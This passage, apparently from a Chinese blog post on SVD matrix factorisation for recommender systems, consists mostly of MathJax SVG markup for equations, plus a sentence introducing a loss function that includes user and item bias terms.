-5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2673, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3728.8, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="TeXAtom" transform="translate(683, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msub" transform="translate(6253.6, 0)"><g data-mml-node="mi"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="TeXAtom" transform="translate(722, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msubsup" transform="translate(8620.8, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(583, -247) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1378, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(10930.3, 0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="msub" transform="translate(11986, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="TeXAtom" transform="translate(683, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g><g data-mml-node="msub" transform="translate(14258.4, 0)"><g data-mml-node="mi"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="TeXAtom" transform="translate(722, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1299, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g><g data-mml-node="msubsup" transform="translate(16317.3, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(583, -257.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1299, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -828.6 1 1157.2"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-8" transform="translate(0, -63.1)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p><img src="/bccd/SVD.png"></p>
<p>在考虑用户的偏见和物品的偏置后，评分会更加复杂，损失函数变为</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 74.871ex"><svg style="vertical-align: -2.12ex; min-width: 74.871ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="5.371ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1437.1)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 1437.1) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="14468.4 -1437.1 1 2374.1"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, 487.1)"><g data-mml-node="mtd"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1037.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2093.6, 0)"><g data-mml-node="mo" transform="translate(479.7, 0)"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(0, -1147.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(961, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1239, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1584, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(1973, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2640, 0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 